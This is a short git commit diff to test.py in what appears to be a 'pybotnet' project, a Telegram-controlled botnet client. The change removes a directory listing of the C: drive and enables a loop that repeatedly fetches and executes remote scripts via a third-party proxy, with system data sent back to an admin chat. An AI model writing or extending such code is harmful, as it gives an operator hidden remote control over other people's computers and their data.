371964b05973596df7de9e1a883978a105327441
onionj <onionj98@gmail.com>
2021-06-22 20:27:40 -0700

    testing new methods

--- test.py
+++ test.py
@@ -11,9 +11,7 @@ bot = pybotnet.PyBotNet(TELEGRAM_TOKEN, ADMIN_CHAT_ID,
                         show_log=True, send_system_data=True)
 
 
-# while True:
-#     print('*'*100)
-#     bot.get_and_execute_scripts_by_third_party_proxy()
-#     time.sleep(delay)
-
-print(bot.run_ls('C:'))
+while True:
+    print('*'*100)
+    bot.get_and_execute_scripts_by_third_party_proxy()
+    time.sleep(delay)
